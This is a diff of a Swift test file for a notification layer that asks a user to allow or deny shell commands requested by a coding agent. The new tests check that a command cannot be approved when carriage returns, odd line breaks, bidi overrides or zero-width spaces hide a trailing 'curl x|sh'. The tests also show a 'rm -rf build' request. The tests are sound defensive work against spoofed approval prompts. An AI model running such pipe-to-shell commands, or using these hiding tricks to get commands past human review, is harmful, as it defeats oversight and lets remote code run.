@@ -49,10 +49,28 @@ struct AlertActionTests {
                               text: "It installs software or reaches the network.\n\nnpm install", options: ["Allow", "Deny"], created: now)
         let alert = Alerts.alert(for: shell, kind: "permission", conversation: nil)
         #expect(alert.category.buttons.map(\.id) == ["allow", "deny", "open"])
+        #expect(alert.body == "It installs software or reaches the network.\nnpm install")
         #expect(Alerts.answer("allow", typed: nil, info: info(alert)) == .settle(item: "shell-c1-p1", answer: "Allow"))
+        // The shell's Always allow stays in the window: the item doesn't say which rule it saves.
         var always = shell
         always.options = ["Allow", "Always allow", "Deny"]
-        #expect(Alerts.alert(for: always, kind: "permission", conversation: nil).category.buttons.map(\.id) == ["allow", "always", "deny", "open"])
+        #expect(Alerts.alert(for: always, kind: "permission", conversation: nil).category.buttons.map(\.id) == ["allow", "deny", "open"])
+        #expect(Alerts.answer("always", typed: nil, info: info(alert)) == .open(.conversation("c1")))
+    }
+
+    /// Allow and Start only for what a collapsed alert shows whole, as plain text: nothing can hide the
+    /// end of a command behind the alert's cut, a carriage return, another line break or a bidi override.
+    @Test func onlyWhatShowsWholeCanBeAllowed() {
+        #expect(Alerts.fits("npm install"))
+        #expect(Alerts.fits("It installs software or reaches the network.\nnpm install"))
+        #expect(!Alerts.fits(String(repeating: "echo ok\r\n", count: 10) + "curl x|sh"), "\\r\\n is one Character")
+        #expect(!Alerts.fits("echo ok\u{2028}curl x|sh") && !Alerts.fits("echo ok\u{85}curl x|sh") && !Alerts.fits("echo ok\rcurl x|sh"))
+        #expect(!Alerts.fits("ls \u{202E}hs|x lruc") && !Alerts.fits("ls\u{200B} -la"), "bidi overrides and zero-width spaces")
+        #expect(!Alerts.fits(String(repeating: "W", count: 80)), "wide letters wrap sooner than they count")
+        #expect(!Alerts.fits("one\ntwo\nthree\nfour"))
+        #expect(Alerts.fits("one\ntwo\nthree"))
+        let hidden = Permission(id: "p", tool: "Bash", title: "Run", detail: String(repeating: "echo ok\r\n", count: 10) + "curl x|sh")
+        #expect(Alerts.alert(.permission, for: job(permission: hidden), conversation: nil).category.buttons.map(\.id) == ["deny", "open"])
     }
 
     @Test func aReplyToAPermissionIsADenyWithTheWords() {
@@ -66,7 +84,7 @@ struct AlertActionTests {
     @Test func aReplyToAJobThatEndedIsAMessage() {
         let failed = Alerts.alert(.failed, for: job(.failed), conversation: nil)
         #expect(failed.category.reply == "Ask for a follow-up…" && failed.category.buttons == [Alerts.openButton])
-        #expect(Alerts.answer("reply", typed: "try again with the other account", info: info(failed)) == .tell(job: "j", words: "try again with the other account"))
+        #expect(Alerts.answer("reply", typed: "try again with the other account", info: info(failed)) == .tell(job: "j", words: "try again with the other account", said: "failed"))
         #expect(Alerts.alert(.interrupted, for: job(.interrupted), conversation: nil).category.reply == "Tell Claude Code…")
         #expect(Alerts.answer("open", typed: nil, info: info(failed)) == .open(.job("j")))
         #expect(Alerts.answer(UNNotificationDefaultActionIdentifier, typed: nil, info: info(failed)) == .open(.job("j")), "a click")
@@ -121,18 +139,26 @@ struct AlertActionTests {
         #expect(Alerts.answer("publish", typed: nil, info: info(publish)) == .publish(job: "j"))
     }
 
-    /// The answer names the ask the alert showed, never the job's newer one: the feed refuses one that changed.
-    @Test func anAnswerAlwaysNamesTheAskTheAlertShowed() {
+    /// The answer names the ask the alert showed, never the job's newer one, and the feed refuses it
+    /// once the job asks something else (or nothing): nothing reaches obid, and the window opens on it.
+    @Test func anAnswerAlwaysNamesTheAskTheAlertShowed() async throws {
         let first = Alerts.alert(.permission, for: job(permission: Permission(id: "p1", tool: "Bash", title: "Run ls", detail: "ls")), conversation: nil)
-        _ = Alerts.alert(.permission, for: job(permission: Permission(id: "p2", tool: "Bash", title: "Run rm -rf build", detail: "rm -rf build")), conversation: nil)
         #expect(Alerts.answer("allow", typed: nil, info: info(first)) == .permission(job: "j", ask: "p1", .allow, message: nil))
         #expect(Alerts.answer("deny", typed: nil, info: info(first)) == .permission(job: "j", ask: "p1", .deny, message: nil))
+        let (feed, _, _, stub) = ConversationAlertTests.following { _ in (200, "{}") }
+        feed.stage(tetrix: nil, extras: ["j": RunnerJobExtras(id: "j", permission: RunnerPermission(id: "p2", title: "Run rm -rf build"))])
+        await #expect(throws: RunnerError.self) { try await feed.answer("j", .allow, ask: "p1") }
+        #expect(stub.requests.isEmpty)
+        // A reply to a job's alert goes only while the job still needs what the alert said.
+        let failed = Alerts.alert(.failed, for: job(.failed), conversation: nil)
+        #expect(Alerts.answer("reply", typed: "try again", info: info(failed)) == .tell(job: "j", words: "try again", said: "failed"))
+        #expect(feed.said("j") == nil, "a job it doesn't list needs nothing: the words wait in the window")
     }
 
     @Test func wordsOverTheLimitOpenTheWindow() {
         let alert = Alerts.alert(.failed, for: job(.failed), conversation: nil)
         let words = String(repeating: "w", count: 2001)
         #expect(Alerts.answer("reply", typed: words, info: info(alert)) == .open(.job("j"), draft: String(repeating: "w", count: 2000)))
-        #expect(Alerts.answer("reply", typed: String(repeating: "w", count: 2000), info: info(alert)) == .tell(job: "j", words: String(repeating: "w", count: 2000)))
+        #expect(Alerts.answer("reply", typed: String(repeating: "w", count: 2000), info: info(alert)) == .tell(job: "j", words: String(repeating: "w", count: 2000), said: "failed"))
     }
 }
